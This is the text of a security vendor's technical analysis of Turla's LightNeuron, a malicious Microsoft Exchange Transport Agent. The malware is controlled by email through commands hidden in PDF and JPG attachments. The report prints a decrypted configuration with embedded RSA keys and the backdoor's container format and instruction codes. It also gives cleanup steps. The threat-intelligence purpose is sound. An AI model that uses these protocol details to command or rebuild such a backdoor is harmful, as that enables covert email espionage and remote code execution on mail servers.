One email away from remote code execution11
4.2
Malicious Transport Agent
This component is responsible for communicating with Microsoft Exchange and with the main malicious DLL.
To our knowledge, this is the first time a Transport Agent has been used for malicious purposes.
Identification
The malicious Transport Agent is a 32-bit Windows DLL developed in .NET. Our analysis is based on the sample
with SHA-1
3C851E239FBF67A03E0DAE8F63EEE702B330DB6C
, apparently compiled on 26/10/2016.
In Figure 7, you can see the seven different classes used by the malicious Transport Agent.
Common_utl
is the class used to process the email and call the second DLL.
ContentFilterAgent
and
SecurityInteropAgent
are, respectively, inheriting from the standard base classes
RoutingAgent
and
SmtpReceiveAgent
.
Figure 7
// Classes implemented by the Transport Agent
Installation
The attackers drop this executable in the Exchange folder located in the Program Files folder. This first step
requires Administrative privileges. Then, they execute the script in Figure 8 to register the DLL as a Transport
Agent. This second step is required before the malware starts receiving events from Exchange.
Figure 8
// PowerShell script to install the malicious Transport Agent,Turla LightNeuron
One email away from remote code execution12
Functions
This Transport Agent implements two classes:
SmtpReceiveAgent
and
RoutingAgent
. These classes
inherit from standard Microsoft Exchange classes, allowing them to receive events from the mail server.
Figure 9 shows a part of the class implementing
SmtpReceiveAgent
.
Figure 9
// SmtpReceiveAgent implementation
One of the events registered is
EndofData
, which the server calls once it has received the entire email.
This event’s callback then calls the
Process
function. The behavior is the same for all the callbacks.
The class
common_utl
contains the
Process
function. As shown in Figure 10, it first logs the date and the
sender of the email. Then, it calls the
CheckMessage
function that then calls the companion DLL to process
email data.
Finally, depending on the return value of
CheckMessage
, it does nothing, modifies the email, or blocks it.,Turla LightNeuron
One email away from remote code execution13
Figure 10
//
Process
function
Figure 11 summarizes the behavior of the LightNeuron Transport Agent. A detailed explanation
of the behavior of the companion DLL is available in the
Backdoor section
.,Turla LightNeuron
One email away from remote code execution14
Internal Email
Microsoft Exchange
Transport
Agent /one.pnum_lnumLightNeuron
Transport Agent
Log date
and Sender
Call the companion DLL
to process the email Transport
Agent n
Block the email
Execute
a commandModify the emailDo nothingExternal Email
Figure 11
// LightNeuron Transport Agent
4.3
Companion Dynamic Link Library
This second component implements most of the malicious functions that are needed
by the Transport Agent.
Identification
The companion DLL is a 64-bit Windows DLL developed in C. Our analysis is based on the sample
with SHA-1
76EE1802A6C920CBEB3A1053A4EC03C71B7E46F8
, apparently compiled on 02/09/2016.
This DLL exports three functions:
•
FL
(aka ForLoading): return 777
•
BLE
(aka BinaryLogEx): Log input data in a log file
•
SV
(aka SimpleValidate): Process an email
The exports’ full names were present in the oldest versions of the DLL, while in the most recent one,
they were shortened.
Initialization
When the Transport Agent loads the DLL, the DLL’s main function performs various initialization tasks.
First, it decrypts, using an XOR operation; most of the strings with the hardcoded key
0xA9
. Figure 12 shows
some interesting strings once decrypted.,Turla LightNeuron
One email away from remote code execution15
Figure 12
// Some decrypted strings
Then, it decrypts the configuration file stored in
%tmp%\winmail.dat
. Microsoft Outlook uses the same
filename when people send messages from an incorrectly configured mail client
[19]. We believe they choose
this filename to hide their configuration file in plain sight as a Microsoft Exchange administrator might
be accustomed to see many legitimate files named
winmail.dat
.
The configuration is encrypted with AES-256, with the first 32 bytes of the file being the RSA-encrypted
AES key. The 1024-bit RSA private key is hardcoded in the binary and it uses the mode PKCS1-v1_5
for encryption.
Figure 13 is an example of a decrypted configuration. Please note that we have redacted
some confidential information.,Turla LightNeuron
One email away from remote code execution16
<Parameters>
CONFIG_FILE_NAME:
c:\Windows\ServiceProfiles\NetworkService\appdata\Local\Temp\msmocf.xml
LOG_LEVEL:17
DEBUG_LOG_FILE_NAME
:c:\Windows\ServiceProfiles\NetworkService\appdata\Local\Temp\msmodl.
dat
CRYPT_KEY: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRH
TkFEQ0JpUUtCZ1FDOG5zc2g2UDJpa29YMnpBOFg3dUpNcmxRWApkM21Pc3VvcWRpa1pzQ1l3TlJCNXc5RVl
jeHRQYVdubEc4L2hCeC9IMG05cnZyelFVamxCa3dieDY5L2tSclhVCmZ5MkE3RGk2NTZldlExMHZPVHlBcH
RualMvRWtBKzFUUGRPSTdkZWcrakNpaDFMNk5TNUJFTyszTTN0aGZrVzcKZVU2ZUdkcVZyeWdiOWV6amxRS
URBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQo=
DECRYPT_KEY: LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlDWFFJQkFBS0JnUURRTWdoRS
9sUlBpbGNNTXFqb1RSMDBJcU0wWkovalFuT2kwZzFTRXJ1dytaQ0tqUit0CmRZSHo1bUVNTXJmbS9uYnZkV
2hRQUxubERpSlNwOHRpa3VHdHdJajFrV09aQ0ppangvazhHWWdoNHZkZmtCSkcKbmlnQnJTMTliSktqMzh0
eElGVWI2NGQwK0hISlczdld1VVJFYUhwZjVFemdmQmdIZ1ZIN2NzaVE1UUlEQVFBQgpBb0dCQUlLMkJzOGF
SbUN4NERqK1RXR2JtS3cwMnZaMy9wSTJGRmV6UFQyOEdTN2hZTWc4RmhsWFgwRjc4STR5CkFaZjdSenpNSD
dPcTRRdFlObUJpaktUVXh1Nm5rYk5MajQxVWhYQks4YUl1S1oxa2lKUG5rY3RVUERWWjN5WmkKS1lKZ3lje
DI0SEozbXF3T05mZTczVElKcEsybDZFRkVDUDJkaTg5aHNZTFhsa2s1QWtFQTcwRGxlMDROMVBIeAozUzBj
WkhFQm9ZNnhyNElvUGJSQmZ2Wkd0NHEyZWs5ZjVldG1idjVvck54WnE4QUpzRkJsOWhBZFIxUE8rdUk5Ckl
0WnVGRzhvM3dKQkFON0VuZWpNQ05Td3FEdlhvSWxBMElFVkd5RlNIcHp1TDFBWW9FSFVhNXZpOFR0VC9KYV
kKN1pSSFNwNUxZeExLZkh6MGovWExBVFo5a2oxVDNkaWpDcnNDUUdlMk1RUC9kTjEvTjhJUndRSUZQcGpDM
jJGaQpRWUZsOXhKTFBhSm9mZXVOSnR2cTdBOW5Od2JmeWZzNmxyaVlVV3FWMTZ0SXVDdG5FT3RlR24rL0kr
OENRQnlsCjFGalh4RnIxek96Rk1oUDBqZHZMeHcxbDdpSG9UNVZSVldxaDBxVGRib0Jlc0tEOVViQTc2dEN
vaVRrbGFSVDQKcm5yQmZJcHhZNWtYYS9Rc0kza0NRUUMzeS9wVUdRK0J1MDhJczBmcTBSQmNmaG5zYXREen
djWjRZS0cwc0NXVgpxeXNjdTZBd3hvaGdjZEN2UGJiNDJYcnZIamFmbTZYYk05aXFnU0lqc0JuRgotLS0tL
UVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=
LOG_OUTPUT
:c:\Windows\ServiceProfiles\NetworkService\appdata\Local\Temp\
MIN_SIZE_TO_ZIP:20000
ZIP_FILE_NAME:
c:\Windows\ServiceProfiles\NetworkService\appdata\Local\Temp\tmpE4BC
CONFIG_UPDATE_INTERVAL:1800
DEBUG_LOG_CRYPT:0
STAT_INTERVAL:5
STAT_PATH:
c:\Windows\ServiceProfiles\NetworkService\appdata\Local\Temp\tmpD48BC
SEND_FROM:[redacted]noreply@[redacted]
COMMAND_REPLY_SUBJECT:
Email_confirmation
COMMAND_REPLY_ATTACH_NAME: Letter; [redacted]; prnt01; Note; Instruction; List; Scanned;
Untitled; report; filename; ATT00001; ticket; Form; Attachment; Information
</Parameters>
Figure 13
// Partially redacted, decrypted configuration example
The configuration does not necessarily specify all the possible parameters. Some parameters,
such as CRYPT_KEY, have their default values hardcoded in the DLL, which could be used in case none
is specified in the
winmail.dat
file.
The different configuration parameters handled by the sample we analyzed are:
• COMMAND_REPLY_ATTACH_NAME
• COMMAND_REPLY_SUBJECT
• CONFIG_FILE_NAME
• CONFIG_UPDATE_INTERVAL
• CRYPT_KEY
• DEBUG_LOG_FILE_NAME
• DECRYPT_KEY
• LIMITS_MAILS_PER_SECOND
• LIMITS_MAILS_PER_SECOND_REFRESH_INTERVAL
• LIMITS_MEMORY_LOAD
• LIMITS_MEMORY_LOAD_REFRESH_INTERVAL
• LOG_LEVEL
• LOG_OUTPUT,Turla LightNeuron
One email away from remote code execution17
• MIN_SIZE_TO_ZIP
• POSTFIX_INCOMING_PATH
• SEND_AT_NIGHT
• SEND_FILE
• SEND_FROM
• SEND_NEW_MAIL_LOCAL_RECIPIENT
• SEND_NEW_MAIL_LOGIN
• SEND_NEW_MAIL_MODE
• SEND_NEW_MAIL_PASS
• SEND_NEW_MAIL_PORT
• SEND_NEW_MAIL_SERVER
• SEND_TIME
• SEND_TO
• STAT_INTERVAL
•
STAT_PATH
• TMP_ID_PATH
• USE_TEMPLATE
• ZIP_FILE_NAME
While most of the parameter names are self-explanatory, an interesting one is CONFIG_FILE_NAME.
This second configuration file contains the rules used to process the emails. We detail this behavior
in the next section.
Rules and handlers
In our example, the rules are defined in
c:\Windows\ServiceProfiles\NetworkService\appdata\
Local\Temp\msmocf.xml
. This file is encrypted in a similar way as
winmail.dat
and the RSA private
key is defined in the configuration parameter DECRYPT_KEY.
Once decrypted, this is an XML file describing rules, as shown in Figure 14. It contains several class nodes,
each one corresponding to a different function (aka handler) implemented in the DLL. Each class node
contains a set of rules describing conditions using the logical operators AND and OR. In addition, each
conditional node has three parameters:
• The field to which the condition applies
• The condition:
cnt
for contains and
!cnt
for does not contain
• The value that is compared to the field value
Finally, at the end of the file is the mapping of the class names with the name of the functions in the DLL.,Turla LightNeuron
One email away from remote code execution18
<class name=""zip"" metric=""30"" id=""1"" dllName=""ZipMe"" type=""dll"" include=""1"">
<rule metric=""10"" id=""1"" include=""1"">
<and>
<or>
<To condition=""cnt"" value=""email1@[redacted]"" />
<From condition=""cnt"" value=""email1@[redacted]"" />
<To condition=""cnt"" value=""email2@[redacted]"" />
<From condition=""cnt"" value=""email2@[redacted]"" />
[...]
</or>
<and>
<To condition=""!cnt"" value=""email3@[redacted]"" />
<From condition=""!cnt"" value=""email3@[redacted]"" />
[...]
</and>
</and>
</rule>
</class>
<class name=""command"" metric=""40"" id=""1"" dllName=""ZipMe"" type=""dll"" include=""1"">
<rule metric=""10"" id=""1"" include=""1"">
<attachment_Content-Type condition=""cnt"" value=""image/jpeg"" />
</rule>
</class>
log:logHandler
zip:zipHandler
changeSubject:changeSubjectHandler
changeBody:changeBodyHandler
create:createHandler
command:commandHandler
block:blockHandler
replace:replaceHandler
stat:statHandler
Figure 14
// Redacted example of a rule file
These rules are applied to every email processed by the DLL. Thus, the behavioral characteristics
of LightNeuron reside in this configuration file.
This configuration is highly flexible, allowing it to perform different actions depending on various fields
of the email. For example, it is possible to collect all the emails sent by one particular email address.
Moreover, the operators customize the rules for each victim. In the sample we analyzed, all the email
addresses contained in the rules belonged to the targeted organization. In one case, they were monitoring
around thirty different email addresses, which probably were the people about whom they were the most
interested in collecting information.
There are eleven different handlers implemented in the DLL and described in Table 1.
Table 1
Description of the handlers implemented in the DLL
Handler nameDescription
block
Block the email
changeBody
Change the body of the email
changeTo
Change the recipient of the email
changeSubject
Change the subject of the email
command
Parse the JPG/PDF attachment, decrypt and execute the commands. This is described in
detail in the
Backdoor section
create
Create a new email
log
Log email attachment in LOG_OUTPUT,Turla LightNeuron
One email away from remote code execution19
Handler nameDescription
replace
Replace the attachment
spam
Re-create and re-send the email from the exchange server to bypass the spam filter
stat
Log From, Date, To, Subject in STAT_PATH in CSV format
zip
Encrypt the email with RSA and store it in the path specified by ZIP_FILE_NAME.
All the handlers are implemented in the same way. In the arguments, there is the email in the form
of a linked-list with the different fields parsed (From, To, body, etc.). The handler can modify this linked-list
and will return a code corresponding to the action it performed, as listed in Table 2.
Table 2
Handler return codes and their descriptions
Return ValueDescription
0No modification
1Email modified
2Block the email
3Error
4Contains .NET assembly
Then, the Transport Agent interprets this return code to know if it should modify the email, block
it or execute .NET assembly code.
Figure 15 is the handler function for zip. Interestingly, it will dump, encrypt the email and store it on disk
but does not compress it. We believe these files are sent back to the attackers using a backdoor command.
Figure 15
// Decompilation output of the zip handler function
Some handlers, such as
changeSubject
, were not used in the rules we analyzed. However, by creating a new
set of rules, we were able to trigger this handler. The modification is easily noticed, as you can see in Figure 16.
Other handlers, such as
changeBody
or
changeTo
, might be used to hide some information or to redirect emails.,Turla LightNeuron
One email away from remote code execution20
Figure 16
// Original email (on the left) and email after the call to changeSubject (on the right)
Backdoor
The command handler is actually the implementation of a backdoor controlled by email.
It has the following properties:
• Depending on the rules, the commands are hidden in a PDF or a JPG attachment.
• It uses steganography to hide data in PDF documents or JPG pictures.
• The email is blocked so it will not be delivered to the final recipient.
Although this may sound very similar to the Turla Outlook backdoor controlled by PDF attachments
that we analyzed in 2018 [16], the format of the attachment is quite different. Thus, we believe a different
programmer or team developed it.
As shown in the configuration example, the rule to execute the command handler applies to every
attachment of type
image/jpeg
going through the Exchange server. It is not very efficient, as most of the
images do not contain commands. As an example, for one victim, the command handler processed around
7000 pictures while only 178 actually contained commands for the backdoor.
Every time the handler is called, it will first check whether the attachment is a PDF document or a JPG image,
as shown in Figure 17.
Figure 17
// Attachment type check (HexRays output),Turla LightNeuron
One email away from remote code execution21
PDF
In the case of a PDF document, the routine first checks for a signature by performing XOR operations
with the data from offset 0x0B to offset 0x10. One way to satisfy this signature condition is by setting
all the values from offset 0x0B to 0x10 to 0x00.
If the previous signature is satisfied, the routine reads the offset of the blob of data containing the command,
which we call the container, from offset 0x11. It also reads the size of the container from offset 0x15. Finally,
it copies the container data. Figure 18 shows these operations.
Figure 18
// Extraction of the container data from the PDF (HexRays output)
A visualization in a hexadecimal editor of the different fields is shown Figure 19.
Figure 19
// Representation in hexadecimal of a PDF containing a container
This PDF, which was modified to embed a command, is still valid as you can see in Figure 20.
Figure 20
// Modified PDF document with embeded commands for LightNeuron. Snake is another name for Turla.,Turla LightNeuron
One email away from remote code execution22
JPG
In case of a JPG image, it first computes a signature using 16 bytes from the first quantization table.
The quantization table is a part of the JPG format and contains data used during the compression of the picture.
It performs several XOR operations on these 16 bytes and compares the result against a hardcoded
signature, as shown in Figure 21.
Figure 21
// Validation of the JPG signature (HexRays output)
We can view these multiple XOR (
) operations on the input, followed by a comparison, as a set
of mathematical equations:
input
/zero.pnum_lnum
input
/four.pnum_lnum = /two.pnum_lnum/five.pnum_lnum/zero.pnum_lnum
input
/one.pnum_lnum
input
/five.pnum_lnum = /one.pnum_lnum/six.pnum_lnum
input
/two.pnum_lnum
input
/six.pnum_lnum = /eight.pnum_lnum/two.pnum_lnum
input
/three.pnum_lnum
input
/seven.pnum_lnum = /one.pnum_lnum/four.pnum_lnum/five.pnum_lnum
input
/zero.pnum_lnum
input
/one.pnum_lnum/zero.pnum_lnum = /four.pnum_lnum/zero.pnum_lnum
input
/one.pnum_lnum
input
/one.pnum_lnum/one.pnum_lnum = /two.pnum_lnum/one.pnum_lnum/nine.pnum_lnum
input
/two.pnum_lnum
input
/one.pnum_lnum/two.pnum_lnum = /two.pnum_lnum/one.pnum_lnum/three.pnum_lnum
input
/three.pnum_lnum
input
/one.pnum_lnum/three.pnum_lnum = /one.pnum_lnum/seven.pnum_lnum/six.pnum_lnum
Once we have the set of equations, we can easily solve it manually or use a SMT (Satisfiability Modulo
Theories) solver such as Microsoft Z3
[20] to find out whether a solution exists and, if so, to find one possible
solution. It turns out this set of equations is solvable and we use the solution to create a JPG image
that can pass the check.
If the previous equation is satisfied, it gets the length of the container from offset 0x0F of the quantization table.
Finally, it extracts the container from the last Start of Scan section, another standard field of the JPG format.
By modifying the quantization table, the resulting picture is also affected. However, the image is still valid,
as shown in Figure 22.,Turla LightNeuron
One email away from remote code execution23
Figure 22
// Modified JPG picture with embedded commands for LightNeuron
Container and command execution
Regardless of the attachment type delivering it, the container format is strictly identical. The first four bytes
are the size of the container and the following bytes are encrypted with AES-256 with a key hardcoded
in the binary. Figure 23 shows an example of an encrypted container.
Figure 23
// Hexadecimal dump of an encrypted container
Once decrypted, we see the different fields used to store information about the commands to be executed.
In Figure 24, we can see some of the most important fields:
• At offset 0x08, the email address to which the result of the command is sent.
• At offset 0x1D, the instruction code. It corresponds to a function in the DLL.
• At offset 0x25, the first argument. It will be passed to the function represented by the instruction code.
Figure 24
// Hexadecimal dump of a decrypted container
If an email containing this particular container, embedded in a JPG or in a PDF, is sent to a server compromised
by LightNeuron, a calculator will be executed on the Microsoft Exchange server.
In addition to the instruction code 0x04, which runs the executable given by the first argument,
there are eight other instruction codes having up to three arguments. Table 2 describes the nine different
backdoor instructions.,Turla LightNeuron
One email away from remote code execution24
Table 2
List of instruction codes
Instruction
CodeDescription Arg 1Arg 2Arg 3
0x01Write a file.
Execute it if it is an executable. Exe pathN/AFile data
0x02Delete a file File pathN/AN/A
0x03Exfiltrate a file File pathSet to “1” to
delete the fileN/A
0x04Execute a process (CreateProcess) Command lineN/AN/A
0x05Execute a command line (cmd.exe /c) Command line N/AN/A
0x06Return 0 N/AN/AN/A
0x07Disable backdoor for N minutes. MinutesN/AN/A
0x09Exfiltrate a file (duplicate function of
0x03) File PathSet to “1” to
delete the fileN/A
0x65No-op N/AN/AN/A
The detailed structure, in C-like syntax, of the container is available Figure 25.
struct
encrypted_container {
int size; //clear text
container[];
//encrypted with AES-256
}
struct
container { //Can contain multiple commands
int CmdId; //Unique ID to identify the container
int rcptl; //Recipient address length
char rcpt[rcptl]; //Recipient address (address to which the output data will be sent)
command[];
//list of commands
}
struct
command {
int InstId; //Unique ID to identify this command
int InstrCode; //The instruction that will be executed
int fpl; //First parameter length
char fp[fpl]; //First parameter
int spl; //Second parameter length
char sp[spl]; //Second parameter
int bpl; //Third parameter length
char bp[bpl]; //Third parameter
}
Figure 25
// Structure of the command container (C-like syntax)
When processing a container, the backdoor writes the
CmdId
value to a log file, located at the path
c:\Win-
dows\ServiceProfiles\NetworkService\AppData\Roaming\Microsoft\Windows\thumbcache_32.
db
. The backdoor checks it just before processing a new container, to check whether this container
has already been processed. This is an anti-replay mechanism, probably to avoid duplicate execution
if the mail server somehow receives the same email multiple times.
Finally, the command output is encrypted with AES and a PDF document or a JPG image is built using
a format similar to that described earlier. Interestingly, it reuses the incoming PDF or JPG and replaces
the command container with a container holding the output data. An email is then created using data
,Turla LightNeuron
One email away from remote code execution25
from the configuration and the destination address provided in the incoming container. For instance,
it uses the following fields from
winmail.dat
:
SEND_FROM:
[redacted]noreply@[redacted]
COMMAND_REPLY_SUBJECT:
Email_confirmation
COMMAND_REPLY_ATTACH_NAME:
Letter; [redacted]; prnt01; Note; Instruction; List; Scanned;
Untitled; report; filename; ATT00001; ticket; Form; Attachment; Information
To send the email, it simply drops it in the folder
<ExchangeInstallFolder>\TransportRoles\PickUp\
and the filename starts with
msg
followed by the result of the
GetTickCount
function. According to the
Microsoft documentation [21]:
The Pickup and replay directories are used by the Transport service on Mailbox servers and Edge
Transport servers to insert message files directly into the transport pipeline
Correctly formatted
email message files that you copy to the Pickup or Replay directories are submitted for delivery
Moreover, Exchange does not perform any security check on the email sent via this folder
[22]:
Any security checks configured on a Receive connector, such as anti-spam, anti-malware, sender
filtering, or recipient filtering actions, aren't performed on messages submitted through the Pickup
directory or the Replay directory
Thus, security solutions will not see the data exfiltrated through LightNeuron, which makes this malware
very stealthy.
An example of an email containing the result of LightNeuron executing a command is shown in Figure 26.
The recipient is
reply@example com
, as specified in the incoming command container. The sender is
noreply@
example com
, which is the address we choose to use to replace the redacted one specified in the original
configuration. The subject header and the attachment name were selected from the lists in the configura -
tion and the incoming PDF was re-used to transport output data.
Figure 26
// Example of an email generated by LightNeuron to send command output,Turla LightNeuron
One email away from remote code execution26
Miscellaneous
Logging
The companion DLL uses logging extensively. The log level can be customized in the configuration file,
allowing logging only relevant information when the malware is implanted on a victim machine.
The log files are encrypted with AES-256. Each log entry contained in the log files is encrypted separately
and the thirty-two first bytes of each log file contain the key.
Regardless of the log’s purpose, each log entry has the same format, as described in Figure 27 in C-like syntax.
struct
log_entry {
DWORD total_size;
QWORD unknown1; //AES encryption begins here
DWORD log_code;
DWORD hex_value;
DWORD unknown2;
DWORD data_size;
char data[data_size];
}
Figure 27
// Log entry structure in C-like syntax
The most important fields are:
• The log code field: each different code corresponds to a different logging event. For example, the log code
0x3C28 corresponds to the execution of a handler.
• The hex value field: Used when the data are numerical. For example, it can contain the Instruction
Code executed by the backdoor.
• The data field: Used to store text data. For example, it can contain the subject of the email.
The log file names vary across the different samples but for the sample we analyzed, we identified
the following six log files:
Table 3
Description of the log files
ComponentPath Description
Transport AgentC:\Windows\serviceprofiles\network -
service\appdata\Roaming\Microsoft\
Windows\814ad43-58ab-2cd3-3e68-b82a8f402fd0 Log the sender and the date of every
email processed by the Exchange server
Transport AgentC:\Windows\serviceprofiles\network -
service\appdata\Roaming\Microsoft\
Windows\42cf8a1-6e20-8c24-d35f-82c46d8b70ba Error log
Companion DLLC:\Windows\serviceprofiles\network -
service\appdata\Roaming\Microsoft\
Windows\36b1f4a-82b9-eb06-7c1e-90b4b2d5c27d Log the date at each execution of the
DLL main
Companion DLLC:\Windows\ServiceProfiles\NetworkService\AppData\
Roaming\Microsoft\thumbcache_idx.db Log backdoor actions
Companion DLLC:\Windows\ServiceProfiles\NetworkService\appdata\
Local\Temp\msmodl.dat Debug log
Companion DLLC:\Windows\ServiceProfiles\NetworkService\AppData\
Roaming\Microsoft\Windows\thumbcache_32.db Log the command id. Used to protect
against replay attacks.,Turla LightNeuron
One email away from remote code execution27
Automatic exfiltration
If the configuration parameters
SEND_TIME
and
SEND_AT_NIGHT
are set, a thread launched by the DLL main
function will loop indefinitely. As shown in Figure 28, it first waits
SEND_TIME
seconds and then checks if the
exfiltration should only occur during the night or during working hours. In the latter case, it checks whether
the hour is between 17:00 and 09:00 and if it is true, it re-enters the sleep loop without exfiltrating any files.
Figure 28
// Exfiltration loop with night check (HexRays output)
The exfiltration function, shown in Figure 29, loops over the files that match the
SEND_FILE
specification.
It is possible to include wildcards in the filename specification to match several different files. Then, for each
file, it will send an email containing the file in either a JPG or a PDF attachment. The
Backdoor section
details
the sending of the emails.
Figure 29
// Exfiltration loop (HexRays output)
Even though we did not see Turla make use of it in the wild, we believe this functionality might be used
to exfiltrate automatically the emails archived by the
zip
handler, as this handler does not implement
any exfiltration mechanism. ,Turla LightNeuron
One email away from remote code execution28
4.4 Evolution
Even without the earliest versions of LightNeuron, we noticed some development effort between
the different versions we have seen:
• There was an effort to obfuscate function names in the .NET Transport Agent.
• Some Indicators of Compromise are different in each sample:
• Mutex names,
• Log file names,
• AES key used by the backdoor.
• The oldest versions only support JPG attachments for the C&C protocol, while the latest versions
also support PDF documents.
4.5
Linux variant
In a previous section, we explained that most of the strings used by LightNeuron are encrypted. It turns
out that some decrypted strings contain strings that make sense only in a Unix environment.
Figure 30 shows some of these strings that refer to Unix. For example,
sendmail
is a common executable
used to send an email on Linux. Thus, piping email content with
cat
to
sendmail
is actually a common way
to send an email in a Linux environment. Further, Postfix is an alternative mail server to
sendmail
.
Figure 30
// Linux strings in the Windows DLL
These Unix artefacts in the Windows malware could be explained by the possible sharing of code between
Windows and Unix implementations.
Hence, the presence of these strings suggests LightNeuron exists for Linux. That would not be surprising,
given that many organizations have Linux mail servers.
5.
REMEDIATION
5.1 Cleaning
The cleaning of LightNeuron is not an easy task.
Simply removing the two malicious files will break
Microsoft Exchange
, preventing everybody in the organization from sending and receiving emails.
Note to other AV vendors: before adding a detection for the Transport Agent files, be aware that doing
so without a proper cleaning routine will render your infected customer’s exchange servers inoperable,
so proceed with caution.,Turla LightNeuron
One email away from remote code execution29
Before actually removing the files, the malicious Transport Agent should be disabled.
First, open
<ExchangeInstallFolder>\TransportRoles\Agents\agents.config
and check every DLL.
All of the genuine Transport Agents should be signed either by Microsoft a trusted software vendor. The
agents.config
file should be similar to Figure 31.
<?xml version=""1.0"" encoding=""utf-8""?>
<configuration>
<mexRuntime>
<monitoring>
<agentExecution
timeLimitInMilliseconds=""90000"" />
</monitoring>
<agentList>
[...]
<agent
name=""Security Interop Agent""
baseType=
""Microsoft.Exchange.Data.Transport.Smtp.SmtpReceiveAgent""
classFactory=""
Microsoft.Exchange.Security.Interop.
SecurityInteropAgentFactory""
assemblyPath=""
c:\program files\microsoft\Exchange Server\v15\bin\
Microsoft.Exchange.Security.Interop.dll""
enabled=
""true""
IsCritical=
""true"" />
<agent
name=""Content Filter Agent""
baseType=
""Microsoft.Exchange.Data.Transport.Routing.RoutingAgent""
classFactory=
""Microsoft.Exchange.Security.Interop.
ContentFilterAgentFactory""
assemblyPath=
""c:\program files\microsoft\Exchange Server\v15\bin\
Microsoft.Exchange.Security.Interop.dll""
enabled=
""true""
IsCritical=
""true""
/>
</agentList>
<settings />
</mexRuntime>
</configuration>
Figure 31
//
agents.config
example
In that example, the malicious DLL is
Microsoft.Exchange.Security.Interop.dll
and two related
Transport Agents are registered:
•
Security Interop Agent
(called <name1> in the following explanations)
•
Content Filter Agent
(called <name2> in the following explanations)
Then, on the Exchange server, execute the following PowerShell commands with admin rights:
Disable-TransportAgent -Identity <name1>
Disable-TransportAgent -Identity <name2>
Uninstall-TransportAgent -Identity <name1>
Uninstall-TransportAgent -Identity <name2>
The malicious Transport Agents are now disabled. After that, it is possible to remove the two malicious files
without breaking Microsoft Exchange.
If you do not plan to re-install the mail server, an important last step is to modify the passwords
of all accounts that have administrative rights on the compromised server. Otherwise, attackers could access
the server again to compromise it again.,Turla LightNeuron
One email away from remote code execution30
5.2 Mitigations
Given that attackers have gained administrative privileges on the Exchange server, there are no bulletproof
mitigations against this threat. However, these few recommendations can help to detect the compromise
and to make the attacker’s work harder.
• Use dedicated accounts for the administration of Exchange servers with strong, unique passwords
and, if possible, 2FA.
• Monitor closely the usage of these accounts.
• Restrict PowerShell execution.
• Regularly check that all the installed Transport Agents are signed by a trusted provider.
6.
CONCLUSION
In addition to their Turla Outlook backdoor
[16], LightNeuron is another example that Turla operators
have a large set of sophisticated, custom malware at their disposal.
To our knowledge, this is the first time a malicious actor has leveraged a Microsoft Exchange Transport
Agent to enable persistence on a mail server. This technique is very interesting as it allows them to receive
commands and exfiltrate data without any filtering.
LightNeuron is a very powerful piece of malware. It can spy on all the emails of the compromised organization
but also execute commands, for example, to control other machines on the local network. This makes
it a main hub in the breached network for Turla operators.
We will continue to monitor Turla developments to help defenders to protect their networks.
Indicators of Compromise can also be found on
GitHub
For any inquiries, or to make sample submissions related
to the subject, contact us at: threatintel@eset com
,Turla LightNeuron
One email away from remote code execution31
7.
BIBLIOGRAPHY
1
B. KNOWLTON, “Military Computer Attack Confirmed,” New York Times, 25 08 2010. [Online]. Available:
https://www nytimes com/2010/08/26/technology/26cyber html?_r=1&ref=technology
. [Accessed 09 04 2018].
2
MELANI, “ Technical Report about the Malware used in the Cyberespionage against RUAG,” 23 05 2016.
[Online]. Available:
https://www melani admin ch/melani/en/home/dokumentation/reports/technical-reports/
technical-report_apt_case_ruag html
.
3
M. Untersinger, “Quelle est la bonne équation pour pacifier le cyberespace ?,” Le Monde, 29 01 2019. [Online].
Available:
https://www lemonde fr/pixels/article/2019/01/29/course-aux-cyberarmes-logiciels-destructeurs-dormants-
le-difficile-apaisement-du-cyberespace_5416003_4408996 html
.
4
A. Cherepanov, “GREYENERGY: A successor to BlackEnergy,” ESET, 2018.
5
A. Cherepanov, “TeleBots are back: Supply-chain attacks against Ukraine,” ESET, 30 06 2017. [Online].
Available: https://www welivesecurity com/2017/06/30/telebots-back-supply-chain-attacks-against-ukraine/
.
6
ESET Research, “Turla Mosquito: A shift towards more generic tools,” 22 05 2018. [Online].
Available:
https://www welivesecurity com/2018/05/22/turla-mosquito-shift-towards-generic-tools/
.
7
Kaspersky GReAT, “Shedding Skin - Turla’s Fresh Faces,” 04 10 2018. [Online].
Available:
https://securelist com/shedding-skin-turlas-fresh-faces/88069/
.
8
ESET Research, “Carbon Paper: Peering into Turla’s second stage backdoor,” ESET, 30 03 2017. [Online].
Available:
https://www welivesecurity com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
.
9
ESET Research, “Gazing at Gazer - Turla’s new second stage backdoor,” ESET, 08 2017. [Online].
Available:
https://www welivesecurity com/wp-content/uploads/2017/08/eset-gazer pdf
.
10
D. Huss, “Turla APT actor refreshes KopiLuwak JavaScript backdoor for use in G20-themed
attack,” 17 08 2017. [Online]. Available:
https://www proofpoint com/us/threat-insight/post/
turla-apt-actor-refreshes-kopiluwak-javascript-backdoor-use-g20-themed-attack
.
11
J.-I. Boutin, “Turla’s watering hole campaign: An updated Firefox extension abusing
Instagram,” 06 06 2017. [Online]. Available:
https://www welivesecurity com/2017/06/06/
turlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram/
.
12
ESET Research, “Diplomats in Eastern Europe bitten by a Turla mosquito,” ESET, 01 2018. [Online].
Available: https://www welivesecurity com/wp-content/uploads/2018/01/ESET_Turla_Mosquito pdf
.
13
National Cyber Security Centre, “Turla group using Neuron and Nautilus tools alongside Snake malware,”
23 11 2017. [Online]. Available:
https://www ncsc gov uk/content/files/protected_files/article_files/Turla%20group%20
using%20Neuron%20and%20Nautilus%20tools%20alongside%20Snake%20malware_1 pdf
.
14
S. Tanase, “Satellite Turla: APT Command and Control in the Sky,” 09 09 2015. [Online].
Available: https://securelist com/satellite-turla-apt-command-and-control-in-the-sky/72081/
.
15
GDATA, “Uroburos – Deeper travel into kernel protection mitigation,” 07 03 2014. [Online].
Available:
https://www gdatasoftware com/blog/2014/03/23966-uroburos-deeper-travel-into-kernel-protection-mitigation
.
16
ESET, “Turla Outlook Backdoor,” 08 2018. [Online]. Available:
https://www welivesecurity com/wp-content/uploads/2018/08/Eset-Turla-Outlook-Backdoor pdf
.
17
GReAT, “APT Trends Report Q2 2018,” Kaspersky Labs, 10 06 2018. [Online]. Available:
